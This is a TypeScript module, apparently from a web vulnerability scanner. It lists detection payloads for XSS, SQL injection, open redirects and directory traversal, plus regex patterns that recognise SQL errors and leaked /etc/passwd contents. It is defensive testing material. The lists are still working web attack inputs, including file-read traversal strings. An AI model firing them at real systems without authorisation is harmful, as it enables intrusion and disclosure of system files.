/** XSS test payloads — non-destructive detection only */
export const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert("secbot-xss-1")</script>',
  '"><script>alert("secbot-xss-2")</script>',
  "'><script>alert('secbot-xss-3')</script>",

  // Event handler injection
  '" onmouseover="alert(\'secbot-xss-4\')"',
  "' onmouseover='alert(\"secbot-xss-5\")'",
  '" onfocus="alert(\'secbot-xss-6\')" autofocus="',

  // IMG tag injection
  '<img src=x onerror="alert(\'secbot-xss-7\')">',
  '"><img src=x onerror="alert(\'secbot-xss-8\')">',

  // SVG injection
  '<svg onload="alert(\'secbot-xss-9\')">',

  // Template literal injection
  '${alert("secbot-xss-10")}',
  '{{constructor.constructor("alert(1)")()}}',
];

/** XSS detection markers to search for in responses */
export const XSS_MARKERS = [
  'secbot-xss-1',
  'secbot-xss-2',
  'secbot-xss-3',
  'secbot-xss-4',
  'secbot-xss-5',
  'secbot-xss-6',
  'secbot-xss-7',
  'secbot-xss-8',
  'secbot-xss-9',
  'secbot-xss-10',
];

/** SQL injection test payloads — non-destructive detection only */
export const SQLI_PAYLOADS = [
  // Classic string-based
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',

  // Numeric-based
  '1 OR 1=1',
  '1 OR 1=1--',
  '1; SELECT 1--',

  // Time-based blind (non-destructive)
  "' OR SLEEP(2)--",
  "1; WAITFOR DELAY '0:0:2'--",

  // Error-based
  "' AND 1=CONVERT(int, @@version)--",
  "' UNION SELECT NULL--",
];

/** SQL error signatures indicating injection vulnerability */
export const SQL_ERROR_PATTERNS = [
  /you have an error in your sql syntax/i,
  /unclosed quotation mark/i,
  /microsoft ole db provider/i,
  /mysql_fetch/i,
  /pg_query/i,
  /sqlite3?\.OperationalError/i,
  /ORA-\d{5}/,
  /quoted string not properly terminated/i,
  /SQL syntax.*?MySQL/i,
  /Warning.*?\Wmysqli?_/i,
  /PostgreSQL.*?ERROR/i,
  /SQLSTATE\[\w+\]/,
  /unterminated string literal/i,
];

/** Open redirect test payloads */
export const REDIRECT_PAYLOADS = [
  'https://evil.example.com',
  '//evil.example.com',
  '/\\evil.example.com',
  'https://evil.example.com%00.legitimate.com',
  '////evil.example.com',
];

/** Directory traversal payloads */
export const TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
];

/** Patterns indicating directory traversal success */
export const TRAVERSAL_SUCCESS_PATTERNS = [
  /root:.*?:0:0/,
  /\[boot loader\]/i,
  /\[extensions\]/i,
  /\[fonts\]/i,
];
